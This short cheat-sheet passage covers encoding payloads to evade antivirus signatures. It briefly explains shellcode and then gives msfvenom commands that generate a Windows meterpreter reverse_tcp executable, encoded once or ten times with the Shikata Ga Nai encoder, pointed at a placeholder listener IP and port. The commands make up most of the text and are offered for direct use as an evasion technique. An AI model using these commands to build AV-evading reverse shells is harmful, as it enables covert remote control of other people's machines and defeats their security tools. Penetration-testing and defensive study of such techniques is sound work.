- Encoding payloads is useful to evade known signatures used by AntiVirus to detect any malicious behaviour.

- Shellcode is a piece of code typically used as a payload for exploitation.

- We will be using Shikata Ga Nai encoding because it's the best solution ATM.

```bash
[+] List encoders
> msfvenom --list encoders

[+] Creating payload and encoding it (One time encoding but we can encode it as much as we want)
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe > /path/to/encoded/binary.exe

[+] Same but encoding the payload 10 times
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -i 10 -e x86/shikata_ga_nai -f exe > /path/to/encoded/binary.exe
```